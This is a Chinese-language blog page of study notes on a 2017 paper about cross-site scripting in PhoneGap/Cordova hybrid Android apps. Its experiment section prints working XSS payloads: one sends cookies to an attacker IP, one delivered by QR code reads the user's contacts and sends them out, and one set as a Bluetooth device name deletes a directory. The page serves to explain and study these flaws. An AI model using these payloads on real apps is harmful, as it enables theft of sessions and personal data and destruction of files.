<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  Cross-site Scripting Attacks on Android Hybrid Applications
  #

:::info
Bao, W., Yao, W., Zong, M., & Wang, D. (2017, March). Cross-site scripting attacks on android hybrid applications. In Proceedings of the 2017 International Conference on Cryptography, Security and Privacy (pp. 56-61).
:::
這一篇論文雖然很舊了，但還是蠻有趣的

  Introduction
  #

他在講的是現在市面上的App通常會用一些像是Apache Cordova(早期叫做PhoneGap)這類型的Hybrid框架製作一款App，但是PhoneGap的做法是利用WebView渲染畫面，因此就勢必會出現XSS相關的攻擊，這一篇論文就是在探討如何達成攻擊，以及受害範圍有多廣

Gartner 的一份報告稱，Hybrid App在基於 HTML5 的 Web  App和本機 App之間提供了平衡，到 2016 年，將在超過 50% 的行動 App中使用
為了美化 UI 並在 JavaScript 程式碼中使用行動裝置的原生功能，Hybrid App必須包含第三方元件，而且它們的程式碼可能不可靠。
在本文的其餘部分，我們首先對WebView和PhoneGap框架的漏洞進行深入分析。 然後根據我們日常生活中行動應用的使用場景，建立了XSS攻擊混合應用的一般流程。 攻擊結果表明，對Hybrid App的 XSS 攻擊可能會對使用者的行動裝置造成更大的破壞性結果。


  Background
  #


What is PhoneGap?

上圖顯示了PhoneGap App的架構以及如何和device component互動，當Hybrid App的某個功能需要使用 PhoneGap API 時， App可以使用 JavaScript 程式碼呼叫 API，然後 App中的特殊層將 PhoneGap API 呼叫轉換為適合幕後特定功能的device API。


  Proposed Method
  #


How XSS attack success on PhoneGap&rsquo;s App?

有兩種方是可以達成這個攻擊

首先從上圖可以知道，外部的資料有很多種型態，可能是一般文字、QRcode、藍牙等等媒介，而當傳送的資料出現malicious code的時候，PhoneGap Interface的App就會接收這些有問題的資料，並且直接被WebView所render，此時attacker就可以直接根據傳送的payload達到竊取機敏資料的目的

在使用者的幫助下注入程式碼。 當使用者開啟將行動裝置連接到外界的通道時，將提供存取權限以允許來自另一個裝置的攻擊。 惡意程式碼是透過在不知不覺中與另一個裝置互動來注入的，然後按照與第一個裝置類似的流程來實現攻擊。"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/survey-papers/android-+-security/cross-site-scripting-attacks-on-android-hybrid-applications/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Cross-site Scripting Attacks on Android Hybrid Applications"><meta property="og:description" content="Cross-site Scripting Attacks on Android Hybrid Applications # :::info Bao, W., Yao, W., Zong, M., & Wang, D. (2017, March). Cross-site scripting attacks on android hybrid applications. In Proceedings of the 2017 International Conference on Cryptography, Security and Privacy (pp. 56-61). :::
這一篇論文雖然很舊了，但還是蠻有趣的
Introduction # 他在講的是現在市面上的App通常會用一些像是Apache Cordova(早期叫做PhoneGap)這類型的Hybrid框架製作一款App，但是PhoneGap的做法是利用WebView渲染畫面，因此就勢必會出現XSS相關的攻擊，這一篇論文就是在探討如何達成攻擊，以及受害範圍有多廣
Gartner 的一份報告稱，Hybrid App在基於 HTML5 的 Web App和本機 App之間提供了平衡，到 2016 年，將在超過 50% 的行動 App中使用 為了美化 UI 並在 JavaScript 程式碼中使用行動裝置的原生功能，Hybrid App必須包含第三方元件，而且它們的程式碼可能不可靠。 在本文的其餘部分，我們首先對WebView和PhoneGap框架的漏洞進行深入分析。 然後根據我們日常生活中行動應用的使用場景，建立了XSS攻擊混合應用的一般流程。 攻擊結果表明，對Hybrid App的 XSS 攻擊可能會對使用者的行動裝置造成更大的破壞性結果。 Background # What is PhoneGap? 上圖顯示了PhoneGap App的架構以及如何和device component互動，當Hybrid App的某個功能需要使用 PhoneGap API 時， App可以使用 JavaScript 程式碼呼叫 API，然後 App中的特殊層將 PhoneGap API 呼叫轉換為適合幕後特定功能的device API。 Proposed Method # How XSS attack success on PhoneGap’s App? 有兩種方是可以達成這個攻擊 首先從上圖可以知道，外部的資料有很多種型態，可能是一般文字、QRcode、藍牙等等媒介，而當傳送的資料出現malicious code的時候，PhoneGap Interface的App就會接收這些有問題的資料，並且直接被WebView所render，此時attacker就可以直接根據傳送的payload達到竊取機敏資料的目的 在使用者的幫助下注入程式碼。 當使用者開啟將行動裝置連接到外界的通道時，將提供存取權限以允許來自另一個裝置的攻擊。 惡意程式碼是透過在不知不覺中與另一個裝置互動來注入的，然後按照與第一個裝置類似的流程來實現攻擊。"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="survey-papers"><meta property="article:tag" content="Meeting Paper"><meta property="article:tag" content="NTU"><title>Cross-site Scripting Attacks on Android Hybrid Applications | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/survey-papers/android-+-security/cross-site-scripting-attacks-on-android-hybrid-applications/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Cross-site Scripting Attacks on Android Hybrid Applications</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#background>Background</a></li><li><a href=#proposed-method>Proposed Method</a></li><li><a href=#experiment>Experiment</a><ul><li><a href=#cookie-stealing-and-session-hijacking>Cookie Stealing and Session Hijacking</a></li><li><a href=#steal-contact-data>Steal Contact Data</a></li><li><a href=#delete-files>Delete Files</a></li></ul></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=cross-site-scripting-attacks-on-android-hybrid-applications>Cross-site Scripting Attacks on Android Hybrid Applications
<a class=anchor href=#cross-site-scripting-attacks-on-android-hybrid-applications>#</a></h1><p>:::info
Bao, W., Yao, W., Zong, M., & Wang, D. (2017, March). Cross-site scripting attacks on android hybrid applications. In Proceedings of the 2017 International Conference on Cryptography, Security and Privacy (pp. 56-61).
:::</p><p>這一篇論文雖然很舊了，但還是蠻有趣的</p><h2 id=introduction>Introduction
<a class=anchor href=#introduction>#</a></h2><p>他在講的是現在市面上的App通常會用一些像是Apache Cordova(早期叫做PhoneGap)這類型的Hybrid框架製作一款App，但是PhoneGap的做法是利用WebView渲染畫面，因此就勢必會出現XSS相關的攻擊，這一篇論文就是在探討如何達成攻擊，以及受害範圍有多廣</p><ul><li>Gartner 的一份報告稱，Hybrid App在基於 HTML5 的 Web App和本機 App之間提供了平衡，到 2016 年，將在超過 50% 的行動 App中使用</li><li>為了美化 UI 並在 JavaScript 程式碼中使用行動裝置的原生功能，Hybrid App必須包含第三方元件，而且它們的程式碼可能不可靠。</li><li>在本文的其餘部分，我們首先對WebView和PhoneGap框架的漏洞進行深入分析。 然後根據我們日常生活中行動應用的使用場景，建立了XSS攻擊混合應用的一般流程。 攻擊結果表明，對Hybrid App的 XSS 攻擊可能會對使用者的行動裝置造成更大的破壞性結果。</li></ul><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><ul><li>What is PhoneGap?
<img src=https://hackmd.io/_uploads/rJsdoZWX0.png alt=圖片>
上圖顯示了PhoneGap App的架構以及如何和device component互動，當Hybrid App的某個功能需要使用 PhoneGap API 時， App可以使用 JavaScript 程式碼呼叫 API，然後 App中的特殊層將 PhoneGap API 呼叫轉換為適合幕後特定功能的device API。</li></ul><h2 id=proposed-method>Proposed Method
<a class=anchor href=#proposed-method>#</a></h2><ul><li>How XSS attack success on PhoneGap&rsquo;s App?
<img src=https://hackmd.io/_uploads/SyPtsW-7R.png alt=圖片>
有兩種方是可以達成這個攻擊<ul><li>首先從上圖可以知道，外部的資料有很多種型態，可能是一般文字、QRcode、藍牙等等媒介，而當傳送的資料出現malicious code的時候，PhoneGap Interface的App就會接收這些有問題的資料，並且直接被WebView所render，此時attacker就可以直接根據傳送的payload達到竊取機敏資料的目的<blockquote><p>在使用者的幫助下注入程式碼。 當使用者開啟將行動裝置連接到外界的通道時，將提供存取權限以允許來自另一個裝置的攻擊。 惡意程式碼是透過在不知不覺中與另一個裝置互動來注入的，然後按照與第一個裝置類似的流程來實現攻擊。</p></blockquote></li><li>另外一種則是直接嵌入有問題的code在網頁中，等到使用者瀏覽這個網頁的時候就會被PhoneGap的WebView所Render，達成和上面一樣的效果，類似傳統的攻擊，受害範圍則是cookies, session hijacking, location leaking&mldr;，用的function是<code>document.cookie</code>, <code>write()</code>, <code>appendChilld()</code>, <code>script</code> tag</li></ul></li></ul><h2 id=experiment>Experiment
<a class=anchor href=#experiment>#</a></h2><p>作者提到，為了分析一些可能受到XSS攻擊的應用場景，這些 App都是使用PhoneGap框架開發的混合 App。 由於Google Play提供的大部分PhoneGap App要麼沒有使用某些存在漏洞的PhoneGap插件，要麼不顯示攻擊效果，因此很難使用真實的 App進行演示。 因此，他們demo了對他們自己的PhoneGap App的攻擊</p><h3 id=cookie-stealing-and-session-hijacking>Cookie Stealing and Session Hijacking
<a class=anchor href=#cookie-stealing-and-session-hijacking>#</a></h3><p>作者把malicious code插在簡單的comment management system中，這個App是PhoneGap Framework做的，而且有storage XSS漏洞。如果這個 App是基於native language的，那麼JavaScript code將永遠不會被執行。 但是，在此 PhoneGap App中，如果 App使用任何易受攻擊的 API 來顯示評論，則程式碼將在 WebView 內執行。
<img src=https://hackmd.io/_uploads/SJ6ehb-mR.png alt=圖片1></p><ul><li>左邊的圖片:<pre tabindex=0><code class=language-javascript! data-lang=javascript!>&lt;script&gt;alert(document.cookie)&lt;/script&gt;
</code></pre>網頁沒有任何異常情況下，作者只使用"append()" API為網頁新增註解。 透過JQuery API顯示評論字段，然後同時觸發注入的程式碼。 顯然，&ldquo;append()&rdquo; API 並不安全。 &ldquo;innerHTML&rdquo; API 比"append()&ldquo;更安全，並且不會運行"script"標籤內的程式碼，因此作者可以使用"innerHTML&rdquo; API 來替換。</li><li>中間的圖片:
這就是用替換成innerHTML的結果，會發現這次的攻擊就沒有成功</li><li>右邊的圖片:<pre tabindex=0><code class=language-javascript! data-lang=javascript!>&lt;img src=x onerror= &#34;alert(document.cookie )&#34;&gt;
</code></pre>但我們還是可以改變payload，讓攻擊可以成功，也就是用上述提到的第二列payload，結果就會如最右邊的截圖</li></ul><hr><p>當然我們也可以嘗試把得到的敏感資訊透過第三個payload傳出去給attacker，得到的response如下</p><pre tabindex=0><code class=language-javascript! data-lang=javascript!>&lt;img src=x onerror= &#34;new Image().src=&#39;http://10.103.30.97:80/cookies/attacker.php?cookie=&#39;%2bdocument.cookie&#34;&gt;
</code></pre><p><img src=https://hackmd.io/_uploads/HJ9W2WZmC.png alt=圖片>
Attacker&rsquo;s Server Receive:</p><pre tabindex=0><code class=language-! data-lang=!>http://10.103.30.97/cookies/manage.php?name=Admin&amp;token=e3afed0047b08059d0fada10f400c1e5
</code></pre><h3 id=steal-contact-data>Steal Contact Data
<a class=anchor href=#steal-contact-data>#</a></h3><p>這次攻擊的標的是QRcode，我們可以把惡意的code嵌入在QRcode當中，如果有利用PhoneGap的App掃描到這個QRcode，因為他是在WebView中進行render，所以這個malicious code會被triggered，這個App使用的是<code>phonegap-plugin-barcodescanner</code>這個plugin，當程式碼顯示時，<code>img</code>的<code>onerror</code>事件將會被觸發，然後使用者的聯絡資料將會傳送給攻擊者。</p><ul><li>Attack Pattern<pre tabindex=0><code class=language-javascript! data-lang=javascript!>&lt;img src=x onerror=
    &#34;navigator.contacts.find([&#39;displayName&#39;,&#39;phoneNumbers&#39;],
    function(c){
    r=&#39;&#39;;
        for(i=0;c[i];i++){
            if(c[i].phoneNumbers&amp;&amp;c[i].phoneNumbers.length){
                r+=c[i].displayName+c[i].phoneNumbers[0].value+&#39;\n&#39;;
        }}
        alert(r);
    new Image().src=&#39;http://10.103.30.97/c.php?d=&#39;+r; })&#34; &gt;
</code></pre></li></ul><p>如果是用Native Language寫的App就會如左邊的圖片那樣只有顯示這個QRcode儲存的資訊，但如果是用PhoneGap寫的App，經過WebView render出來的結果，就會顯示手機的聯絡人資訊。他是用<code>navigator.contacts.find</code>這個API去呼叫PhoneGap的聯絡人plugin的Java code來搜尋使用者的聯絡人
<img src=https://hackmd.io/_uploads/B158hZWmR.png alt=圖片2></p><h3 id=delete-files>Delete Files
<a class=anchor href=#delete-files>#</a></h3><p>這一次換成利用藍牙這個標的達成攻擊，原文提到:</p><blockquote><p>一般來說，如果一個應用程式具有藍牙傳輸功能，它必須能夠讀取和寫入用戶行動裝置上的文件</p></blockquote><p>為了demo攻擊的效果，作者使用<code>cordova-plugin-bluetooth-serial</code>插件和<code>cordova-plugin-file</code>插件開發了一個PhoneGap應用程式。藍牙裝置的名稱是透過<code>innerHTML</code>API顯示的，安全性不夠，攻擊者可以將藍牙裝置的名稱更改為惡意程式碼來實現攻擊。 並且與前兩種設計類似的是再次使用了<code>onerror</code>事件。</p><ul><li>Attack Pattern<pre tabindex=0><code class=language-javascript! data-lang=javascript!>&lt;img src=x onerror=
    &#34;window.requestFileSystem(LocalFileSystem.PERSISTENT,0
    ,function(f){
        f.root.getDirectory(&#39;ID_5&#39;,null,
            function (e){
                e.removeRecursively(
                    function(){
                        alert(&#39;Delete ID_5 Success!&#39;)
                },null); },null); },null);&#34;&gt;
</code></pre></li></ul><p>同樣的如果用native app進行連線，就不會遇到攻擊的問題(如左圖)，但如果是用右圖的PhoneGap設計的App，<code>window.requestFileSystem()</code>要求系統存取根檔案系統並傳回一個對象，該物件儲存在<code>FileSystem</code>變數f中。 它的 root 屬性包含一個<code>DirectoryEntry</code>對象，表示目前檔案系統的根目錄。 所以我們使用<code>f.root.getDirectory()</code>來搜尋根目錄中的<code>ID_5</code>目錄。 當找到目錄時，將回傳值儲存在<code>DirectEntry</code>物件e中，並呼叫第5行至第9行中的回呼函數。 然後<code>ID_5</code>目錄的<code>DirectEntry</code>物件呼叫其名為<code>removeRecurively()</code>的方法來刪除<code>ID_5</code>中的所有檔案。 第8行，右圖顯示指定目錄刪除成功的通知。
<img src=https://hackmd.io/_uploads/rkNt3--mR.png alt=圖片3></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#background>Background</a></li><li><a href=#proposed-method>Proposed Method</a></li><li><a href=#experiment>Experiment</a><ul><li><a href=#cookie-stealing-and-session-hijacking>Cookie Stealing and Session Hijacking</a></li><li><a href=#steal-contact-data>Steal Contact Data</a></li><li><a href=#delete-files>Delete Files</a></li></ul></li></ul></nav></div></aside></main></body></html>